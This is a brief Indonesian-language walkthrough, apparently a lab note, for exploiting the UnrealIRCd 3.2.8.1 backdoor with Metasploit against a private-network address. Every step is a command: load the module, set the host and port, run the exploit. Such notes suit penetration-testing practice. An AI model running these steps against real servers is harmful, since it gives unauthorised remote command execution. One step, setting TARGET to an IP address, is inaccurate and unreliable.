# UnrealIRCd 3.2.8.1 - Backdoor Command Execution

### Jalankan Metaxploit
```bash
msfconsole
```

### Gunakan exploit *UnrealIRCd 3.2.8.1 - Backdoor Command Execution*
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Atur tujuan exploit
*192.168.0.101* sebagai contoh
```bash
set TARGET 192.168.0.101
```

## Tujuan dapat juga diatur dengan syntax berikut
```bash
set RHOST 192.168.0.101
```
## Atur port (jika perlu)
di sini service port yang digunakan oleh UnrealIRC adalah 6606
```bash
set RPORT 6606
```

## Eksekusi exploit
```bash
exploit
```
